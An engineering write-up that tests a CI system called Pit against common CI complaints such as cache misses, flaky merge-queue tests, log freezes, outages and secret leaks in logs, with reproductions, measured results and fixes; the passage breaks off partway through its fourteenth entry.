# CI pain points vs Pit

Each entry is a complaint real teams make about CI, with sources, a reproduction run
against Pit on one machine, and a verdict backed by what was measured. Verdicts:
**SOLVED** (reproduced, Pit handles it, evidence below), **PARTIAL**, **NOT SOLVED**.

## Backlog (not yet tested)

All items from the first backlog have been tested (P1–P15).

## P1. Cache misses are silent, and eviction makes them random

**Pain.** GitHub Actions caps each repo's cache at 10 GB and evicts least-recently-used
entries in near real time. Teams report CI that is "intermittently slower with nothing in
the job log to explain it" ([WaveHouse#535](https://github.com/Wave-RF/WaveHouse/issues/535)),
eviction adding ~40 minutes to release builds ([objeck-lang#940](https://github.com/objeck/objeck-lang/issues/940)),
nightly caches that are always evicted before the next night ([photocraft#2688](https://github.com/storytold/photocraft/issues/2688)),
and GitHub staff confirming the thrash ([nodejs/node#61436](https://github.com/nodejs/node/issues/61436)).
"Cache keys are confusing, cache misses are silent, eviction is opaque"
([Ian Duncan](https://www.iankduncan.com/engineering/2026-02-05-github-actions-killing-your-team/)).

**Reproduction** (`/tmp/painhunt/p1`): `build` (inputs `src/**`, `tsconfig.json`, outputs `dist/**`)
and `test` (deps `build`, inputs `src/**`, `test/**`). Run, rerun, then edit `tsconfig.json`
without committing.

**Before** (feat/pit-mvp): keys are computed, never hand-written, so there is no key
confusion, and nothing is evicted, so there are no random misses. But a miss was silent:

```
== run 3: change tsconfig.json (uncommitted)
build passed message= None
test passed message= None
```

`test`'s own inputs did not change at all; it reran because `build`'s did, and nothing said so.

**Fix** (research/pain-hunt): the action key is now built from explainable parts (task
definition and environment, dep keys, input files), stored with each cache entry. On a
miss, the worker diffs against the task's last cached run and says why:

```
== C: uncommitted tsconfig.json change
    ✓ build                    2.0s  ran because tsconfig.json changed
    ✓ test                     1.0s  ran because build changed
== D: add a file and break the test
    ✓ build                    2.1s  ran because src/z.ts added
  ✗ default.test: exited with 1 · ran because task definition or environment changed; src/z.ts added; build changed
```

The reason is also on the task in the API and dashboard. Covered by the unit test
`explains_why_a_task_missed_the_cache` and assertions in the e2e test
`local_runs_cache_restore_outputs_and_ship_overlays`.

**Verdict: SOLVED** (updated after P4). Silent misses: explained. Eviction: Pit now evicts
least recently used results under a size limit (P4), and a task whose last result was
evicted says so ("ran because its earlier result was evicted to keep the cache under its
size limit").

## P2. A flaky test ejects innocent changes from the merge queue

**Pain.** Flaky tests are said to burn 15–25% of CI compute on reruns
([DEV.to](https://dev.to/byteframe/github-actions-slow-whats-actually-wasting-your-time-4elh)).
In a merge queue it is worse: a flake fails the queued entry, the PR is ejected even
though it did not touch the failing code, and every PR behind it is rebuilt. "A test that
fails 5% of the time … has a 5% chance of blowing up the entire queue on every cycle"
([tenki](https://tenki.cloud/blog/github-merge-queue-setup)). Reports from Sep–Oct 2026:
5 of 12 failed merge groups in one day were flakes
([awslabs/aidlc-workflows#1712](https://github.com/awslabs/aidlc-workflows/pull/1712)),
four groups ejected in an hour at ~20 minutes each for everyone behind them
([KeepOak/Branch-Agent#1152](https://github.com/KeepOak/Branch-Agent/pull/1152)), and
silent drops while the PR page reads CLEAN ([cleat#3307](https://github.com/cleat-team/cleat/issues/3307)).
See also [Mergify#5158](https://github.com/Mergifyio/mergify/discussions/5158),
[aiur#4193](https://github.com/aiur-team/aiur/issues/4193),
[intent#5249](https://github.com/intent-hq/intent/issues/5249),
[learn-ukrainian#9069](https://github.com/learn-ukrainian/learn-ukrainian.github.io/pull/9069),
[iterion#1410](https://github.com/SocialGouv/iterion/issues/1410).
The fix teams converge on: retry once inside the queue only, flag the flake loudly, keep
PR CI strict.

**Reproduction** (`/tmp/painhunt/p2`): a task that fails the first attempt of every run
("flaked: connection reset") and passes the second; queue a branch with an unrelated change.

**Before** (feat/pit-mvp): the innocent change is ejected and never lands.

```
q_1c0c0ad3cdff   failed   innocent → main   default.flaky,default.unit   tests failed in run run_00a9587a48ff
main has b.txt? 0
```

**Fix** (research/pain-hunt): merge queue runs get one automatic retry per task
(`Job.flake_retries`); any task can opt into more with `retries: N`. A pass on a retry is
reported as `flaky: attempt 1: exit 1, passed on attempt 2`, counted in `/api/stats`
(`tasksFlaky`), shown in `pit run` and the dashboard, and **not cached**.

```
q_34de37c48c68   landed   innocent → main   tested
main has b.txt? 1
  flaky passed flaky: attempt 1: exit 1, passed on attempt 2
log: flaked: connection reset / [pit: attempt 1 failed (exit 1); retrying] / pass on retry
```

The first version cached the flaky pass, so a strict `pit run` on the same tree was served
from the cache and the flake disappeared. Flaky passes are no longer cached; on a second
innocent change:

```
q_1f4f7b203856   landed   innocent2 → main   tested
== strict local run on the landed tree
    ✗ flaky                    7ms exit 1
```

Covered by the e2e test `merge_queue_retries_flakes_once_and_flags_them`.

**Verdict: SOLVED** for ejection. Flaky tests still cost a retry each time they flake;
Pit reports and counts them, but does not quarantine them automatically.

## P3. Long logs freeze the browser

**Pain.** GitHub Actions' log viewer locks up on long builds: "logs from long builds
(>10,000 lines) freeze the browser" ([HN 46908491](https://news.ycombinator.com/item?id=46908491)).

**Reproduction** (`/tmp/painhunt/p3`): a task printing 200,000 lines (3.7 MB). Open its log
on the run page in headless Chromium 1243 at 1280×900, measuring main-thread long tasks
with a `PerformanceObserver` (`/tmp/shots/logperf.mjs`).

**Before** (feat/pit-mvp): the panel rendered the whole log as one text node, and while a
task streamed it rebuilt and re-stripped the whole string on every chunk.

```
{"visibleAfterMs":2769,"longTasks":3,"worstMs":1836,"totalBlockedMs":2238}
```

**Fix** (research/pain-hunt): logs over 2,000 lines render virtualized: fixed 18 px lines,
only the lines in view plus a margin are in the DOM, colour codes are stripped only for
those, and the panel shows the line count. Short logs keep the wrapped view.

```
{"visibleAfterMs":700,"longTasks":2,"worstMs":199,"totalBlockedMs":271}
```

Worst freeze 1,836 ms → 199 ms; time to visible 2.8 s → 0.7 s. The panel opens at the tail
("done", "200,002 lines").

**Run overhead from log volume** (warm runs, same task): 0 lines 258 ms total; 20,000 lines
710 ms; 200,000 lines 901 ms, of which ~0.5 s is draining and uploading the 3.7 MB log after
the process exits. A first run on a new repo took 3.0 s, mostly mirror and workspace setup.

**Verdict: SOLVED** for the browser freeze at 200k lines. Long lines do not wrap in the
virtualized view (they scroll horizontally), and logs over 8 MB are still truncated
(head kept) by the worker.

## P4. A self-hosted cache grows until the disk is full

**Pain.** Self-hosted Turborepo cache servers do not evict: Garden Snail "does not remove old
artifacts" and suggests S3 object expiration ([garden-snail](https://github.com/pkarolyi/garden-snail));
guides for ducktors/turborepo-remote-cache size the disk by artifacts × builds × retention days
and leave cleanup to storage lifecycle rules ([computingforgeeks](https://computingforgeeks.com/self-hosted-turborepo-remote-cache/),
[turborepo-remote-cache](https://www.npmjs.com/package/turborepo-remote-cache)). bazel-remote is
the counterexample: a max cache size (5 GiB default) enforced by deleting least recently used
files ([bazel-remote](https://github.com/buchgr/bazel-remote)). It is also the other half of P1:
GitHub's 10 GB cap evicts silently.

**Reproduction** (`/tmp/painhunt/p4`): a task whose output is 2 MB of random bytes, keyed on
`src/v`; build 15 versions.

**Before** (feat/pit-mvp): no size option at all.

```
CAS grew by 30 MB over 15 builds; total 37 MB
{'cacheEntries': 55, 'casBlobs': 171, 'casBytes': 37153062}
```

**Fix** (research/pain-hunt): `--cache-max-gb` (default 20, `0` unlimited). Every 60 s, if the
CAS is over the limit, Pit sweeps blobs nothing refers to, then evicts least recently used
cache entries and Turborepo/Bazel artifacts a tenth at a time until usage is under 90% of the
limit. Kept: blobs younger than 2 minutes (an upload about to be referenced looks unreferenced
for a moment) and logs and overlays of runs from the last 14 days. Evictions are logged,
emitted as `cache.evicted`, and counted in `/api/stats`; `POST /api/gc` collects on demand. A
worker whose cache hit loses its outputs to eviction mid-restore runs the task instead of
failing.

**A bug the live run caught.** The first version kept evicting while the only bytes over the
limit were young blobs it could not delete yet, so it evicted every entry, newest included,
and the next pass emptied the cache:

```
right after 15 more 2MB builds (new blobs are inside the 2 min grace):
  casBytes=46.6MB limit=20MB entries=20 evicted=50
after grace + periodic gc:
  casBytes=6.6MB limit=20MB entries=0 evicted=70
```

Fixed: young blobs do not count toward the target, so the collector waits for them instead.
Same experiment after the fix, on the live server with a 20 MB limit:

```
right after 15 builds of 2MB each:          casBytes=36.6MB entries=15 evicted=0
next periodic gc, blobs still inside grace: casBytes=36.6MB entries=15 evicted=0
after the grace period:                     casBytes=16.6MB entries=5  evicted=10
newest build cached?   ◆ artifact   cached
cache gc: evicted 10 entries, deleted 20 blobs, freed 20001830 bytes (36649291 -> 16647461, limit 20000000)
```

Covered by the e2e tests `cache_is_kept_under_its_size_limit` (oldest evicted, newest still a
hit, evicted rerun explained) and `gc_does_not_empty_the_cache_for_blobs_it_cannot_free_yet`
(fails on the first version).

**Verdict: SOLVED**, with a limit: the store can exceed the cap for up to about three minutes
(2 minute grace plus the 60 s check) when builds upload faster than that. Unlike bazel-remote,
there is no hard limit that rejects uploads.

## P5. Docker builds start cold on every run

**Pain.** Hosted runners are discarded after each job, so Buildx "rebuilds the full Dockerfile
from layer zero" unless `cache-from` and `cache-to` point at an external backend
([Blacksmith](https://www.blacksmith.sh/blog/cache-is-king-a-guide-for-docker-layer-caching-in-github-actions),
[RunsOn](https://runs-on.com/github-actions/docker-layer-caching/),
[Ken Muse](https://www.kenmuse.com/blog/implementing-docker-layer-caching-in-github-actions/)).
Even then the gha backend shares the 10 GB Actions budget and gets evicted, multi-stage builds
need `mode=max`, and `RUN --mount=type=cache` contents are not carried to the next runner at all
([devopsboys](https://devopsboys.com/blog/docker-build-slow-no-cache-fix-2026),
[Dash0](https://www.dash0.com/faq/cache-docker-images-github-actions),
[devopskit](https://devopskit.in/blog/docker-build-slow-github-actions-fix/),
[DEPT](https://engineering.deptagency.com/how-to-speed-up-docker-builds-in-github-actions)).
"Why your Docker build takes 11 minutes in CI when it takes 20 seconds locally"
([DEV.to](https://dev.to/libme/why-your-docker-build-takes-11-minutes-in-ci-when-it-takes-20-seconds-locally-3foe)).
Listed in the backlog from [Medium](https://medium.com/@akhilesh-mishra/your-github-actions-runners-are-slow-and-you-are-paying-too-much-for-them-5406577314fe).

**Reproduction** (`/tmp/painhunt/p5`): a Dockerfile with an 8 s dependency layer, a
`--mount=type=cache` step that takes 4 s when its cache is cold, then `COPY src`. A Pit host
task runs `docker build` (BuildKit; `docker-buildx` had to be installed on this box), with
Pit's own task cache off so only Docker's cache is measured. Change `src/` between runs
without committing.

**Result** (no Pit changes needed):

```
== run 1 (cold daemon)
    #8 DONE 8.8s                                  (dependency layer)
    #9 5.648 cache mount: cold
passed in 29.9s
== run 2 (source changed, uncommitted)
    #8 CACHED
    #9 CACHED
passed in 6.0s
```

With the cache-mount step moved after `COPY` so it reruns on every change:

```
== source a   cache mount: warm   WALL 7.09s
== source b   cache mount: warm   WALL 5.15s
== source c   cache mount: warm   WALL 5.81s
```

**Two things found.**
- A test task that pipes `docker build` into `grep | tail` reports success even when the
  build fails (the shell returns the last command's status). That bit this reproduction
  once; it is a config mistake, not a Pit bug, but worth knowing.
- Pit's default remote cache is wrong for `docker build`: the image is not a declared
  output, so a hit on another worker would skip a build whose image is not in that
  worker's daemon. Documented in the README ("Docker builds"): use `cache: "workspace"` or
  `false` for image builds.

**Verdict: SOLVED** (updated after P11). On a single worker, layers and cache mounts persist
with no setup: 29.9 s → 5–7 s per rebuild. With several workers each has its own Docker
cache; since P11 the scheduler sends a group back to the worker that ran it last, so a fleet
stays warm the same way. Docker caches are still not shared between workers.

## P6. Push and pray: "try fix CI" commits, and no way to test CI config locally

**Pain.** "We've somehow normalized a dev loop that involves `git commit -m "try fix"`, waiting
10 minutes, and repeating" ([HN 46908491](https://news.ycombinator.com/item?id=46908491)); there
is no sensible way to test or even lint the CI config locally
([Lobsters](https://lobste.rs/s/hkqnro/github_actions_is_slowly_killing_your)). The usual answer,
nektos/act, shortens the loop but runs an approximation: different images (up to 18 GB for the
closest one), no GitHub API, partial `actions/cache`, manual secrets, limited macOS and Windows,
so guides still say to confirm on real runners
([Better Stack](https://betterstack.com/community/guides/scaling-docker/act-github-actions-tutorial/),
[Stéphane Robert](https://blog.stephane-robert.info/en/docs/pipeline-cicd/github/act/),
[Earthly](https://earthly.dev/blog/using-github-actions-locally/),
[codewithahsan](https://blog.codewithahsan.dev/run-your-github-actions-locally-with-act-faster-feedback-better-debugging/),
[Jordan Marcelino](https://jordan-marcelino.vercel.app/blog/stop-waiting-on-ci-run-github-actions-locally-with-act)).

**Reproduction** (`/tmp/painhunt/p6`): a repo with a bare origin; tasks `lint` (no
`console.log`) and `test` (`sum(2,2) === 4`). Introduce a bug, fix it in two steps, add a task
to the pipeline config, all uncommitted, then commit, push, and run CI on the pushed commit.

**Result:**

```
== 1. introduce a bug (uncommitted)
    ✗ lint   1.1s exit 1   │ 1:exports.sum = (a, b) => { console.log(a); return a - b; };
    ✗ test   3.0s exit 1   │ sum(2,2) = 0
== 2. fix the logic, forget the console.log
    ✗ lint   1.0s exit 1
    ✓ test   2.1s
== 3. edit the pipeline itself (uncommitted): add a typecheck-ish task
    ✓ syntax 85ms   ✓ lint 1.0s   ✓ test 2.1s  ran because src/sum.js changed
loop: 8.8s, commits made: 0
== 4. commit + push, then the CI run for the pushed commit
push run passed in 206 ms
   lint cached   syntax cached   test cached
```

Three iterations in 8.8 s with no commits, including a change to the pipeline. The run for the
pushed commit was entirely cache hits: `pit run` and CI are the same pipeline on the same
workers with the same action keys, not an emulation, so CI had nothing left to do.

**A gap the reproduction found.** Broken configs failed fast and clearly (trailing comma: 87 ms;
dep on a missing task: 143 ms), but a typo'd field was silently ignored:

```
== unknown field (typo: 'imputs')
passed in 149ms · 1 ran, 0 cached          (inputs silently fell back to every file)
```

Fixed: config structs reject unknown fields.

```
error in 101ms · parsing pit.config.json: unknown field `imputs`, expected one of `run`, `deps`,
`inputs`, `outputs`, `env`, `cache`, `backend`, `image`, `network`, `timeout`, `retries` at line 1 column 39
```

Covered by the unit test `typos_in_the_config_are_errors`.

**Verdict: SOLVED**, with the caveat that `pit run` needs a reachable Pit server and workers
for the target OS; it does not run anything on the laptop itself.

## P7. A GitHub outage stops all CI

**Pain.** When GitHub is down, Actions is down: a four-hour outage in February 2026
([NERVICO](https://nervico.com/en/blog/github-actions-alternatives-ci-cd/)) and a 7.5-hour one on
Aug 17, 2026, with GitHub's CTO saying capacity planning had to go from 10x to 30x
([HackerNoon](https://hackernoon.com/ai-agents-are-killing-the-git-client-not-git-what-anthropics-scion-and-cursors-origin-show)).
Pit keeps GitHub as the source of truth, so the question is what still works without it.

**Reproduction** (`/tmp/painhunt/p7`): repo with a bare origin and a `feature` branch; one run
while origin is up; then make origin unreachable (`mv origin.git origin.git.down`).

**Before** (research/pain-hunt at P6):

```
-- uncommitted change            passed in 154ms
-- new local commit (unpushed)   passed in 137ms
-- merge queue during the outage
Please make sure you have the correct access rights and the repository exists.   (nothing queued)
== RECOVERY                      (no entry)
```

CI kept working: workers already hold the base commit in their warm mirrors, and changes,
including unpushed commits, travel in the overlay. The queue refused the change with raw git
output, so nothing landed afterwards either.

**Fixes** (research/pain-hunt):
- Queueing during an outage uses the server mirror's last fetched state of the branch. The
  entry waits with a reason, and each queue tick retries the fetch.
- A branch Pit has never fetched gets an explanation instead of git output.
- A bug the first live run caught: the CLI only made a relative local remote (`../origin.git`)
  absolute if the path existed, so during the outage it registered the repo with a relative
  URL and the entry could never land. Local remotes now resolve lexically.

```
-- never-seen branch during outage:
pit: 400 Bad Request: feature2 is not known to Pit yet, and /tmp/painhunt/p7/origin.git is unreachable
('/tmp/painhunt/p7/origin.git' does not appear to be a git repository); Pit can only queue branches it fetched before the outage
== OUTAGE  (feature2 seen by the server earlier, as a push webhook would)
q_ea22b0d2b458   queued   feature2 → main   waiting for origin to come back ('/tmp/painhunt/p7/origin.git' does not appear to be a git repository)
== RECOVERY
after 3s:   q_ea22b0d2b458   landed   feature2 → main   tested
main has src/c.txt? 1
```

Covered by the e2e test `merge_queue_waits_out_an_origin_outage` and the unit test
`local_remotes_resolve_even_when_missing`.

**Verdict: PARTIAL.** Running CI no longer depends on GitHub being up, and queued changes land
as soon as it is back. But nothing can be merged or reported to GitHub during an outage (it is
still the source of truth), and webhooks GitHub fails to deliver are not replayed by Pit.

## P8. Checkouts are slow, and flaky

**Pain.** Every GitHub Actions job clones fresh. On T3 Code's CI (Blacksmith runners, sparse
checkout already on) `actions/checkout` takes 8 to 10 s in each of ~15 jobs (run 38701079905,
see [bench/](../bench/README.md)). And it is flaky: "actions/checkout failing for no clear reason,
sometimes only passing on the 3rd built-in retry" ([HN 46614558](https://news.ycombinator.com/item?id=46614558)).
Anthropic's Scion post describes the same problem at scale: 25 million CI checkouts a day
([Anthropic](https://www.anthropic.com/engineering/redesigning-source-control)).

**Speed, measured on T3 Code** (28,081 files, 507 MB of history; workspace prepare time
from Pit's own records):

| Run | Prepare |
| --- | --- |
| First run ever on this worker (full clone from GitHub) | 184.8 s |
| First move to a new commit | 3.2–3.4 s |
| Every warm run after that | 332–376 ms |

Against 8–10 s per job, every job, on GitHub.

**Flakiness, reproduced** (`/tmp/painhunt/p8`): push a commit, make origin unreachable for
about 2 s, and start a run on that commit (as a push webhook would).

**Before** (research/pain-hunt at P7): no retry; the run errored at once.

```
error  git fetch -q --prune --no-tags origin failed …: fatal: '/tmp/painhunt/p8/origin.git' does not appear to be a git repository
```

**Fix:** fetches retry after 0.5 s, 1 s and 2 s (`git::retry`, used by every fetch on the
server and workers).

```
… retrying in 500ms / retrying in 1000ms / retrying in 2000ms
passed in 3929 ms
```

**A worse bug the reproduction exposed.** Repos were identified by directory name, so three
unrelated scratch repos all called `work` (p6, p7, p8) shared one repo row and one mirror, each
`pit run` overwriting the URL. Folder names like `app`, `api`, `web` collide easily. Now the
URL decides identity: a different repo with a taken name is registered as `<name>-<hash>`.

```
   work         /tmp/painhunt/p8/origin.git
   work-d17519  /tmp/painhunt/p7/origin.git
```

Covered by the unit tests `retry_survives_a_blip_and_gives_up_eventually` and
`same_name_different_url_is_a_different_repo`.

**Verdict: SOLVED** for speed after the first clone and for short network blips. Outages
longer than the ~3.5 s of retries fail the run (the merge queue waits them out, P7). The
first clone on a new worker is still a full clone; there are no partial or sparse clones yet.

## P9. Every push runs to completion, even when a newer push replaced it

**Pain.** Without a `concurrency` block, pushing twice runs both commits to the end; the fix
is boilerplate every repo has to remember (`group: ${{ github.workflow }}-${{ github.ref }}`,
`cancel-in-progress: true`), plus exceptions so main and deploys are not cancelled
([RunsOn](https://runs-on.com/github-actions/concurrency/),
[Stéphane Robert](https://blog.stephane-robert.info/en/docs/pipeline-cicd/github/optimiser/concurrency/),
[GitSpider](https://gitspider.com/guides/github-actions-concurrency-cancel-in-progress),
[nwos](https://www.nwos.com/daily/the-github-actions-concurrency-key-everyone-skips),
[StarSling](https://starsling.dev/best-practices/github-actions/cancel-superseded-runs),
[oneuptime](https://oneuptime.com/blog/post/2026-01-25-github-actions-concurrency-control/view),
[yellowduck](https://www.yellowduck.be/posts/cancel-in-progress-jobs-using-github-actions),
[adhdecode](https://adhdecode.com/articles/github-actions/workflow-run-canceled-by-newer-run/),
[ittrip](https://en.ittrip.xyz/windows/troubleshooting/github-actions-concurrency)). Agents
that push after every small change make it worse; no source measured that yet.

**Reproduction** (`/tmp/painhunt/p9`): three pushes to `feature`, one second apart, each
starting a run (as push webhooks would) of an 8 s task.

**Before** (research/pain-hunt at P8): all three ran to the end; 24.5 s of worker time for one
useful result. The dashboard's Cancel also only skipped unclaimed groups; running work kept
going.

```
run_8ef9ecbebaf7 passed task passed 8008 ms
run_acca5a6a47b7 passed task passed 8024 ms
run_c71291138f5b passed task passed 8439 ms
```

**Fix** (research/pain-hunt), on by default with no config:
- A new run supersedes older active runs with the same repo, trigger and ref, for pull
  requests, local `pit run`, and pushes to branches other than `main`/`master`/`trunk`. Merge
  queue, post-merge and main-branch runs always finish.
- Cancelling (superseding, the Cancel button, the merge queue dropping a candidate) revokes the
  leases of running groups. The worker's heartbeat, now every 2 s, is refused, and it kills the
  task's process group (and Docker container); nothing new starts in that group.

```
run_32b693c08dbf failed task skipped ran 863 ms  | superseded by run_39fb129c0fad
run_39fb129c0fad failed task skipped ran 1113 ms | superseded by run_5a6a20ed9b3a
run_5a6a20ed9b3a passed task passed  ran 8018 ms |
```

About 10 s of worker time instead of 24.5 s. Covered by the e2e test
`newer_pushes_supersede_and_stop_older_runs` (each superseded task would have written a marker
file had it run to the end; none did) and the unit test
`cancellation_stops_the_task_and_its_children`.

**Verdict: SOLVED.** Caveats: a stopped task can run up to one heartbeat (2 s) after the
cancel, and superseding is keyed on the branch name, so two people running `pit run` locally on
identically named branches of the same repo would cancel each other.

## P10. Path filters leave required checks stuck on "Expected"

**Pain.** Monorepos add `paths:` filters so a docs-only PR skips CI, but a required check
whose workflow did not run never reports, and the PR sits at "Expected — Waiting for status to
be reported", unmergeable. GitHub's own docs say not to path-filter required workflows; the
workarounds are a gate job that always runs, a mirror no-op workflow, or a polling action
([GitHub Docs](https://docs.github.com/en/enterprise-server@3.15/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks),
[community#26698](https://github.com/orgs/community/discussions/26698),
[#49124](https://github.com/orgs/community/discussions/49124),
[#72708](https://github.com/orgs/community/discussions/72708),
[#25720](https://github.com/orgs/community/discussions/25720),
[Medium](https://medium.com/@khawaja.muhammad.mushood/how-to-fix-waiting-for-status-to-be-reported-in-github-984b9c44cee4),
[devopsinterviewkb](https://devopsinterviewkb.com/questions/github/branch-protection/required-status-check-stuck-expected-forever),
[wait-for-status-checks](https://github.com/poseidon/wait-for-status-checks)).

**Reproduction** (`/tmp/painhunt/p10`): a monorepo with `backend` and `frontend` groups (inputs
`backend/**` and `frontend/**`, 3 s each) and a `docs/` folder. A second Pit server with GitHub
token mode pointed at a mock GitHub API (`mockgh.py`) that records every commit status. Signed
webhooks: a push to main, then PRs from a docs-only branch and a backend-only branch.

**Result** (no Pit changes needed):

```
== push to main (warms the cache)
    {'pit / backend': 'success', 'pit / frontend': 'success'}
== PR from docs-only
    {'pit / backend': 'success', 'pit / frontend': 'success'}
    run passed in 794 ms; backend:cached, frontend:cached
== PR from backend-change
    {'pit / backend': 'success', 'pit / frontend': 'success'}
    run passed in 3492 ms; backend:passed, frontend:cached
```

Pit never skips a group to save time. A group whose inputs did not change is a cache hit
and reports success in milliseconds, so every required check always reports. No `paths:`
filter, gate job or mirror workflow needed, and the check names never change.

**Verdict: SOLVED.** One gap: if the config itself fails to load, Pit reports a single
`pit / plan` failure, and the per-group required checks stay at "Expected" (the PR is still
blocked, which is the safe direction, but the reason is on a different check).

## P11. Jobs land on cold machines

**Pain.** On a fleet of self-hosted runners, a job lands on whichever runner is free, often
one that has never seen the repo, so its caches start cold; hosted-runner vendors sell
"sticky" disks and cache volumes to keep a job's state on the machine it lands on
([Blacksmith](https://www.blacksmith.sh/blog/cache-is-king-a-guide-for-docker-layer-caching-in-github-actions),
[RunsOn](https://runs-on.com/github-actions/docker-layer-caching/)). The same gap was the open
half of P5.

**Reproduction** (`/tmp/painhunt/p11`): a second worker (`w2`) next to the built-in one; a
repo whose `install` (3 s, `cache: "workspace"`) is remembered per warm workspace; ten runs
with a small change each.

**Before** (research/pain-hunt at P10): runs went to whichever worker asked first, so each
worker paid the cold install once (in an N-worker fleet: up to N times per repo, and N times
again after every lockfile change).

```
run  1 on w2     install=passed  total= 3615ms
run  2 on w2     install=cached  total=  420ms
run  3 on w2     install=cached  total=  191ms
run  4 on local  install=passed  total= 3398ms
run  5–7 on local, run 8–10 on w2: install=cached
```

**Fix** (research/pain-hunt): soft affinity in the scheduler. A queued group waits up to 2 s
for the worker that last ran the same group of the same repo, if that worker polled in the
last 30 s; after that any worker may take it. A waiting worker rechecks every 250 ms so the
hold never stalls the queue.

After a lockfile change (every workspace must reinstall once):

```
run 11 on w2     install=passed  total= 3363ms
run 12–20 on w2  install=cached  total= 114–419ms
```

One cold install instead of one per worker. Covered by the unit test
`a_group_waits_briefly_for_its_warm_worker` (held for the warm worker, taken by it, free for
anyone after the hold).

**Verdict: SOLVED.** Trade-off: affinity concentrates a repo's runs on one worker; when that
worker is busy it stops polling and other workers take the group after the 2 s hold. Caches
are still per worker, not shared.

## P12. Fully cached work still waits in line for a runner

**Pain.** When CI is busy, jobs queue for a runner: GitHub caps concurrent jobs per account
(20 on Free), and teams report runs pending for hours behind other work in the same group
([StarSling](https://starsling.dev/best-practices/github-actions/cut-queue-time),
[devopsil](https://devopsil.com/articles/2026-03-30-github-actions-workflow-stuck-queued-fix),
[community#12835](https://github.com/orgs/community/discussions/12835),
[#163115](https://github.com/orgs/community/discussions/163115),
[#147604](https://github.com/orgs/community/discussions/147604),
[#184661](https://github.com/orgs/community/discussions/184661),
[GitHub changelog](https://github.blog/changelog/2026-05-07-github-actions-concurrency-groups-now-allow-larger-queues/),
[ZeroOne](https://laplusda.com/en/posts/github-actions-concurrency-pending-cancelled/),
[ni18](https://blog.ni18.in/waiting-for-a-runner-to-pick-up-this-job/)). With many agents
running CI at once, the queue is the bottleneck, even for work that is already done.

**Reproduction** (`/tmp/painhunt/p12`): warm the cache for a repo (`build` and `test`, both
cacheable), then fill all four worker slots (two workers, two slots each) with 60 s jobs from
another repo, then rerun the cached repo.

**Before** (research/pain-hunt at P11): every task was a cache hit, but the group still needed a
worker slot to report that, so it waited behind the long jobs.

```
passed in 58.2s · 0 ran, 2 cached
```

**Fix** (research/pain-hunt): at planning time the server computes each task's action key
itself, from its mirror's tree (`git ls-tree`, the same blob ids a worker's index has) plus the
overlay. If every task in a group is a cache hit, the group is finished on the spot ("on
cache") and never offered to a worker. Workspace-cached setup tasks are "not needed" when
everything depending on them hit. Groups with uncacheable tasks, a leaf setup task, or
`--no-cache` go to a worker as before. Resolved groups emit the usual events, so the CLI and
dashboard show them like any other group.

```
== rerun the fully cached repo (every slot busy)
  default on cache
    ◆ build                    cached
    ◆ test                     cached
passed in 98ms · 0 ran, 2 cached
== a run with a real change still goes to a worker (waits for a slot)
   (still waiting for a free slot after 8s, as expected)
```

58.2 s → 0.1–0.3 s. Covered by the e2e test `fully_cached_runs_do_not_wait_for_busy_workers`
(all four slots busy; the cached run must finish within 3 s, on `cache`).

**Verdict: SOLVED** for fully cached groups. A group with even one task to run still waits for
a slot. Keys depend on the worker's OS, arch and the values of declared `env` variables; the
server uses its own, so a fleet of a different OS or arch, or tasks keyed on env values that
differ on the server, simply go to a worker (a missed shortcut, never a wrong hit).

## P13. Secrets leak into CI logs

**Pain.** In March 2025 the `tj-actions/changed-files` action was compromised (CVE-2025-30066):
its tags were repointed to a commit that dumped the runner's memory and printed every secret
it found into the build log, double-base64-encoded so exact-match masking would not catch it.
23,000 repositories used the action; Endor Labs found 218 that printed secrets (AWS keys,
GitHub PATs, npm tokens, private keys) into logs, readable by anyone on public repos
([GitHub Advisory](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3),
[Wiz](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066),
[StepSecurity](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised),
[Unit 42](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/),
[Phoenix Security](https://phoenix.security/tj-actions-compromise/),
[Cycode](https://cycode.com/blog/github-actions-supply-chain-attack/),
[Medium](https://medium.com/@simardeep.oberoi/github-actions-supply-chain-attack-how-tj-actions-changed-files-leaked-secrets-and-what-you-need-9e2677e07f68),
[ThreatIntelReport](https://threatintelreport.com/articles/github-actions-supply-chain-attack-tj-actions-changed-files-and-reviewdog-action-setup/),
[Safeguard](https://safeguard.sh/resources/blog/tj-actionschanged-files-github-action-compromise)).

**Reproduction** (`/tmp/painhunt/p13`): the worker has `DEPLOY_TOKEN=tok_live_9f8e7d6c5b4a`; a
task that receives it prints it plain, base64, and double base64.

**Before** (research/pain-hunt at P12): Pit had no masking at all; the token was in the live
stream and the stored log, readable by anyone with dashboard access. (A second worker without the
variable first produced empty output: the affinity from P11 had routed the run there.)

```
plain=tok_live_9f8e7d6c5b4a
b64=dG9rX2xpdmVfOWY4ZTdkNmM1YjRh
b64x2=ZEc5clgyeHBkbVZmT1dZNFpUZGtObU0xWWpSaAo=
```

**Fix** (research/pain-hunt): a task field `secrets: [names]`. Values are passed through
like `env`, but only the names enter the cache key (rotating a secret does not invalidate the
cache). Before a log line is streamed or stored, the worker replaces exact values and any
base64 token (standard or URL-safe, padded or not) that decodes, up to three layers, to text
containing a secret. Docker tasks now get variables by name (`-e NAME`), so values never
appear in the `docker run` command line visible in `ps`.

```
    deploy │ plain=***
    deploy │ b64=***
    deploy │ b64x2=***
```

Covered by the unit test `masks_plain_and_encoded_secrets` and the e2e test
`secrets_are_masked_in_logs` (the task still sees the real value).

**Verdict: PARTIAL.** Pit now catches what GitHub's exact-match masking missed in the tj-actions
attack, but masking is defense in depth: a task that can read a secret can always print it some
other way (hex, split across lines) or send it over the network. The real protections are not
running untrusted code with secrets (Pit does not run fork PRs automatically) and short-lived
credentials. Logs stored before a variable was declared under `secrets` are not rewritten, and
values declared under plain `env` are not masked.

## P14. Slow test suites need hand-built sharding

**Pain.** Jest, Vitest and Playwright all support `--shard=i/n`, but on GitHub Actions each repo
wires it up by hand: a `strategy.matrix` of shard indexes, `fail-fast: false`, the build and
install repeated in every matrix job, reports merged afterwards, and shard counts that need
maintaining as the suite grows ([Playwright docs](https://playwright.dev/docs/test-sharding),
[Vitest#4752](https://github.com/vitest-dev/vitest/discussions/4752),
[WarpBuild](https://www.warpbuild.com/blog/concurrent-tests),
[oneuptime](https://oneuptime.com/blog/post/2025-12-20-github-actions-parallel-tests/view),
